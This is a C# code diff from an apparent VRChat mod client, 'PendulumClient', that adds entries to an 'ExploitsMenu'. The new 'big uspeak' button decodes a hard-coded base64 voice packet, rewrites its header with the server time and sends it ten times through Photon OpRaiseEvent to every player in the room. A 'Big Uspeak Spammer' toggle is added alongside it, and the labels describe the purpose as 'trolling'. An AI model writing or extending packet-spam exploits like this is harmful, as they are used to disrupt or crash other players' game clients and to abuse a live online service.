@@ -113,12 +113,28 @@ namespace PendulumClient.ButtonAPIV2
             ExploitsMenu.AddToggle("Event209", "we do a slight amount of trolling", b => {
                 MenuFunctions.EnableEvent209(b);
             });
+            ExploitsMenu.AddToggle("Big Uspeak Spammer", "we do a massive amount of trolling", b => {
+                MenuFunctions.EnableEventBigUspeak(b);
+            });
             ExploitsMenu.AddButton("Small Event9", "we do a small amount of trolling", () => {
                 MenuFunctions.SmallEvent9();
             });
             ExploitsMenu.AddButton("big uspeak", "deez", () => 
             {
-                MelonCoroutines.Start(MenuFunctions.BigUSpeak());
+                //MelonCoroutines.Start(MenuFunctions.BigUSpeak());
+                byte[] VoiceData = Convert.FromBase64String("AgAAAKWkyYm7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7DrSy5tkRecs21ljjofvebe6xsYlA4cVmgrd0=");
+				byte[] nulldata = new byte[4];
+				byte[] ServerTime = BitConverter.GetBytes(VRC.SDKBase.Networking.GetServerTimeInMilliseconds());
+				Buffer.BlockCopy(nulldata, 0, VoiceData, 0, 4);
+				Buffer.BlockCopy(ServerTime, 0, VoiceData, 4, 4);
+				for (int i = 0; i < 10; i++)
+				{
+					Anti.PhotonExtensions.OpRaiseEvent(1, VoiceData, new Photon.Realtime.RaiseEventOptions
+					{
+						field_Public_ReceiverGroup_0 = 0,
+						field_Public_EventCaching_0 = 0
+					}, default(ExitGames.Client.Photon.SendOptions));
+				}
                 //var data = new byte[] { 0, 1, 0, 0, 0, 255, 255, 255, 255, 1, 0, 0, 0, 0, 0, 0, 0, 15, 1, 0, 0, 0, 203, 0, 0, 0, 2, 2, 0, 0, 0, /*end8*/255, 251, 145, 127, 204, 44, 46, 0 };
                 //var data7 = new byte[] { };
                 //PendulumClient.Anti.PhotonExtensions.OpRaiseEvent(1, data5, Anti.PhotonExtensions.UnreliableEventOptions, Anti.PhotonExtensions.UnreliableOptions);
